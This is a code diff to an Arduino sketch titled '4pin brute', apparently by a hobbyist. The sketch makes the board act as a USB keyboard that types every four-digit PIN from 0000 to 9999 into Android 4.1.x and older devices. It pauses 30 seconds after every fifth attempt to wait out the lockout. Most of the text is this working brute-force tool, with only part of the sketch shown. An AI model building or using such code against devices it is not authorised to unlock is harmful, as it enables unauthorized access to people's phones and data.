@@ -1,5 +1,12 @@
 /*
-*/
+ * 4pin brute
+ *
+ * this sketch outputs numbers 0000 - 9999 as an hid device for pin brute 
+ * forcing. testing against android devices of version 4.1.x and less.
+ *
+ * cesar@pissedoffadmins.com
+ *
+ */
 
 int fPINinput = 0;
 int i = 0;
@@ -19,25 +26,25 @@ void loop()
       String pad = i;
 
       if (i<=9){
-        Keyboard.print("000" + pad);
+        Keyboard.println("000" + pad);
       }
       else if (i>=10 && i<=99){
-        Keyboard.print("00" + pad);
+        Keyboard.println("00" + pad);
       }
       else if (i>=100 && i<=999){
-        Keyboard.print("0" + pad);
+        Keyboard.println("0" + pad);
       }
       else {
-        Keyboard.print(i);
+        Keyboard.println(i);
       }
 
       delay(500);
-      Keyboard.println();
+      //Keyboard.println();
 
       if (i!=0 && i%5==0){
         digitalWrite(ledPin, HIGH);
         delay(30000);
-        Keyboard.println();
+        //Keyboard.println();
       }
     }
     fPINinput = 1;
